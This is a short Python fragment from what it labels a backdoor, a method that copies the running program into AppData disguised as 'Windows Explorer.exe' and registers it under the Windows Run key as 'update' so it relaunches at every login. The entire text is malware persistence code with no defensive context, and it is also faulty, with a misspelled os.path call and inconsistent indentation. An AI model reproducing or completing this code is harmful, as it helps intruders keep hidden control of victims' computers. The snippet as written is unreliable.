#in backdoor file
    def become_persistent(self):
        evil_file_location= os.environ["appdata"]+"\\Windows Explorer.exe"
        if not os.path.exsists(evil_file_location):
                shutil.copyfile(sys.executable,evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' +evil_file_location + '"',shell=True)

